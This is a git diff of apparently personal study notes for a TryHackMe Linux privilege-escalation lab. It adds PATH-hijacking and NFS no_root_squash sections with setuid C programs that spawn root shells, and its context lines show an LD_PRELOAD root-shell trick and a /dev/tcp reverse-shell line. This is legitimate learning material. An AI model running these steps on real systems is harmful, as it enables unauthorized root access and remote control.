@@ -8,6 +8,8 @@ https://tryhackme.com/room/linprivesc
 - [[#`sudo`]]
 - [[#SUID]]
 - [[#Capabilities]]
+- [[#Cron Jobs]]
+- [[#PATH]]
 
 
 ___
@@ -190,7 +192,7 @@ system("/bin/bash");
 `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 
 3. Run any program with sudo rights (e.g. apache2, find, ...) and LD_PRELOAD option pointing to shell.so
-`sudo LD_PRELOAD=/home/user/ldpreload/shell.so <program_with_sudo_rights>`
+	`sudo LD_PRELOAD=/home/user/ldpreload/shell.so <program_with_sudo_rights>`
 
 $\Rightarrow$ Shell with root privilege has spawned!
 
@@ -206,7 +208,10 @@ Classic permissions: file can or can't be read, written, executed by owner, owne
 
 Indicated by `s` for **s**pecial permission
 
-**`find / -type f -perm -04000 -ls 2>/dev/null`**: list files with SUID/SGID set
+List files with SUID/SGID set
+```Shell
+find / -type f -perm -04000 -ls 2>/dev/null
+```
 
 **Compare executables with [GTFO Bins list](https://gtfobins.github.io/#+suid)**
 
@@ -254,75 +259,77 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
 ___
-### 
+### PATH
 [[#Table of contents|Back to the top]]
 
+*Linux environmental variable, tells OS where to find executables*
+*--> commands not built-in and not defined with absolute path --> Linux searches in folders defined under environmental variable PATH*
 
+1. What **folders** are located under $PATH
+	`echo $PATH`
+
+2. Do I have **write** privileges for any of these folders
+```Shell
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+```
+If we see a `folder` occurring several times on step 1., refine search:
+```Shell
+find / -writable 2>/dev/null | grep "folder" | cut -d "/" -f 2,3 | sort -u
+```
+
+3. Can I **modify** $PATH --> try to add easiest folder to write to: **`/tmp`**
+	`export PATH=/tmp:$PATH`
+
+4. Is there a **script/application** I can start that will be affected by this vulnerability
+
+**Payload, `path.c`**
+```C
+#include<unistd.h>
+void main()
+{ setuid(0);
+  setgid(0);
+  system("puck");
+}
+```
+*looks for "puck" executable under PATH*
+`gcc path.c -o path`
+`chmod u+s path` (SUID)
+
+In writable folder under PATH
+`echo "/bin/bash" > puck`
+`chmod 777 puck`
+
+*Just executing `puck` wouldn't privilege escalate, running `path` gives us privilege escalation because it runs with root privileges*
+
+*`puck` can give a root shell, but it could also be a simple `cat` command in order to read a restricted file*
 
 ___
-### 
+### NFS
 [[#Table of contents|Back to the top]]
 
+*Network File Sharing --> SSH, Telnet*
 
+Default: NFS changes root user to nfsnobody  and strip any file from operating with root privileges. 
 
-___
-### 
-[[#Table of contents|Back to the top]]
+If **`no_root_squash`** option is present on writable share (e.g. `/tmp`) --> create executable with SUID and run on target
 
+1. On attacker machine, **enumerate** target mountable shares and find which ones have `no_root_squash`
+	**`showmount -e target_ip`**
+	**`cat /etc/exports`**
 
+2. On attacker machine, **mount** `no_root_squash` share
+	**`mkdir` /tmp/backupsonattackermachine**
+	**`mount -o rw target_ip:/backups /tmp/backupsonattackermachine`**
 
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
-### 
-[[#Table of contents|Back to the top]]
-
-
-
-___
+3. On attacker machine, in `/tmp/backupsonattackermachine`, build **executable**
+**`nfs.c`**
+```C
+int main()
+{ setuid(0);
+  setgid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
+`gcc nfs.c -o nfs`
+`chmod +s nfs`
